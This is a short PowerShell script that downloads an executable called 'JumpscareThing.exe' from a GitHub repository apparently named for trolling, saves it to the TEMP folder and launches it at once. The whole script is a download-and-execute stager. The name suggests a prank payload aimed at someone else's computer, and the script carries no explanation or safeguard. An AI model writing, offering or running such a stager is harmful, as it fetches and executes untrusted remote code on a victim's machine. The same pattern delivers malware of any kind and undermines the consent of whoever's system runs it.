$url = "https://github.com/lordryan1999/MarcelloTroll/raw/main/JumpscareThing.exe"
$outpath = "$env:TEMP/JumpscareThing.exe"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $outpath)

$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "$env:TEMP/JumpscareThing.exe" -ArgumentList $args
